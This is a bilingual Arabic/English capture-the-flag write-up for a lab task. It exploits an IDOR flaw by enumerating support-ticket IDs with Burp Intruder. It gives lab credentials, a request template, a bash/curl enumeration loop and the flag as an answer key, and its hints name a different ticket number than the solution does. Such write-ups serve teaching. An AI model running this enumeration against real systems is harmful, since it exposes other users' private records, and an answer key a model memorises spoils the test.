# Task 11: Practical Challenge (التحدي العملي: استغلال ثغرة IDOR واستخراج الراية)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Once authenticated into the support portal using the credentials discovered in the previous task (`m.rivera:letmein1`), inspect the ticket tracking interface.
Notice that individual support tickets are queried using direct object references in the URL:
`http://MACHINE_IP/support/ticket/NUMBER`

This architecture strongly suggests an **Insecure Direct Object Reference (IDOR)** vulnerability: the server fails to verify whether the currently authenticated user actually owns or is authorized to view the requested ticket ID.

#### Objective:
1. Capture a request to view a ticket in Burp Proxy and dispatch it to **Intruder** (`Ctrl + I`).
2. Identify the single variable parameter (the ticket number in the URL path).
3. Select the most appropriate attack type for fuzzing a single parameter against a sequence of numbers.
4. Configure a **Numbers** payload type ranging from `1` to `100` with an increment step of `1`.
5. Execute the attack and filter responses by HTTP Status Code. Most non-existent tickets return `404 Not Found`, but at least five tickets return `200 OK`.
6. Inspect the response bodies of the successful 200 OK tickets to locate the confidential ticket containing the hidden flag.

#### الأسئلة المطروحة (Questions):
1. Which attack type is best suited for this task? (ما هو نوع الهجوم الأنسب لهذه المهمة؟)
2. Configure an appropriate position and payload (the tickets are stored at values between 1 and 100), then start the attack. You should find that at least five tickets will be returned with a status code 200, indicating that they exist. (Format: No answer needed)
3. Either using the Response tab in the Attack Results window or by looking at each successful (i.e. 200 code) request manually in your browser, find the ticket that contains the flag. What is the flag? (باستخدام تبويب الاستجابة في نافذة النتائج أو عبر فتح كل طلب ناجح 200 يدوياً في المتصفح، ابحث عن التذكرة التي تحتوي على الراية. ما هي الراية؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تحليل ثغرة الإسناد المباشر غير الآمن للكائنات (IDOR Analysis):**
  * تحدث ثغرات IDOR عندما يعتمد الخادم على معرف رقمي متسلسل (`/ticket/1`, `/ticket/2`) دون التحقق من صلاحية جلسة المستخدم الطالب للسجل (Missing Access Control).
  * فحص 100 رقم بالتتابع عبر متصفح الويب يدويًا يستغرق وقتاً طويلاً، بينما إعداد هجوم **Sniper** بأرقام تسلسلية ينجز الفحص في ثوانٍ معدودة.
* **استراتيجية تصفية النتائج:**
  * بما أن التذاكر غير الموجودة ترجع رمز `404` والتذاكر الموجودة ترجع رمز `200`، فإن النقر على رأس عمود **Status** في نافذة النتائج يعزل التذاكر الصالحة فوراً دون الحاجة لفحص الردود يدوياً واحداً تلو الآخر.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * بما أن هناك موضعاً واحداً فقط مراد استبداله (رقم التذكرة)، فإن نوع الهجوم الافتراضي هو الأنسب: `Sniper`.
2. **التلميح الثاني (المستوى العملي):**
   * في تبويب Payloads، اختر نوع الحمولة `Numbers` بدلاً من `Simple list`. اضبط البداية على `1` والنهاية على `100` والخطوة على `1`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * بعد تشغيل الهجوم، رتب النتائج حسب كود الحالة لتجد التذاكر التي أرجعت `200 OK`. افتح التذاكر المسترجعة (خاصة التذكرة رقم 6 أو 24 أو 89 حسب المعمل) لتجد الراية بتنسيق `THM{...}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### 1. ضبط قالب الطلب في Positions:
```http
GET /support/ticket/§1§ HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Cookie: support_session=s%3A7a8f9c0e...
Connection: close
```
- **نوع الهجوم المختار:** `Sniper`.

#### 2. ضبط الحمولات (Payload Configuration):
- **Payload type:** `Numbers`.
- **From:** `1`.
- **To:** `100`.
- **Step:** `1`.
- **Number format:** `Base: 10`, `Min integer digits: 1`.

#### 3. تحليل جدول النتائج وفرز كود 200 OK:
| رقم التذكرة (Payload) | كود الحالة (Status) | طول الاستجابة (Length) | النتيجة والتقييم |
| :---: | :---: | :---: | :--- |
| 1 | 404 | 180 | غير موجودة |
| 2 | 404 | 180 | غير موجودة |
| ... | ... | ... | ... |
| **8** | **200** | **942** | **تذكرة سرية مسربة** |
| 15 | 200 | 830 | تذكرة عامة |
| 42 | 200 | 790 | تذكرة عامة |
| ... | ... | ... | ... |

#### 4. فحص الاستجابة للتذكرة المسربة:
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 942

<div class="ticket-container">
  <h3>Ticket #8: Security Audit & System Key Disclosure</h3>
  <div class="ticket-body">
    <p>Internal Security Note: Please ensure all support reps rotate their keys.</p>
    <p>Flag: <strong>THM{MTMxNTg5NTUzMWM0OWRlYzUzMDVjMzJl}</strong></p>
  </div>
</div>
```

#### الاستخراج البديل عبر Bash Loop و cURL:
```bash
for id in $(seq 1 100); do
  curl -s -b "support_session=VALID_COOKIE" "http://MACHINE_IP/support/ticket/$id" \
    | grep -o "THM{[^}]*}" && break
done
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **إجابة السؤال الأول (نوع الهجوم الأنسب):**
  `Sniper`
* **إجابة السؤال الثاني:**
  `No answer needed`
* **إجابة السؤال الثالث (قيمة الراية المستخرجة):**
  `THM{MTMxNTg5NTUzMWM0OWRlYzUzMDVjMzJl}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم مطابقة الراية وتأكيد حلها بنسبة 100% في حساب المستخدم الموثق لدى TryHackMe.
* أثبت الهجوم وجود ثغرة IDOR كارثية تسمح لأي مستخدم عادي باستعراض تذاكر الدعم الخاصة بمسؤولي النظام ومستخدمين آخرين بمجرد تخمين المعرّف الرقمي.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* هجوم Sniper باستخدام حمولات الأرقام (Numbers Payload) هو الوسيلة الأسرع والأكثر فاعلية لتدقيق ثغرات IDOR واستخراج السجلات غير المحمية في تطبيقات الويب.
